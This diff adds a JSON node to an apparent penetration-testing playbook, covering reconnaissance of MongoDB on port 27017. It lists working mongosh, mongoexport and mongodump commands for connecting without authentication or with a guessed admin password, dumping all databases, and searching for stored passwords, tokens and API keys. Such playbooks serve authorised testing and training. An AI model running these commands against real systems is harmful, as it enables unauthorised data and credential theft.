@@ -1,0 +1,18 @@
+{
+  "id": "mongodb",
+  "phase": "RECON",
+  "title": "MongoDB (27017)",
+  "body": "Unauthenticated MongoDB exposes all databases. No auth by default in older versions. Dump everything — creds are often stored in plaintext.",
+  "cmd": "mongosh $ip\nmongosh mongodb://$ip:27017\n\n# If auth required\nmongosh mongodb://admin:password@$ip:27017\n\n# Enumerate and dump\n> show dbs\n> use <dbname>\n> show collections\n> db.<collection>.find()\n> db.<collection>.find().pretty()\n\n# Dump all\nmongoexport --host $ip --db <db> --collection <col> --out dump.json\nmongodump --host $ip --out ./mongodump/\n\n# Look for users, passwords, tokens, API keys\n> db.users.find()\n> db.accounts.find()\n\n# Check for credentials in all collections\n> db.getCollectionNames().forEach(c => { print(c); db[c].findOne(); })",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Found credentials",
+      "next": "creds_found"
+    },
+    {
+      "label": "Found app data — check for web vectors",
+      "next": "web_enum"
+    }
+  ]
+}
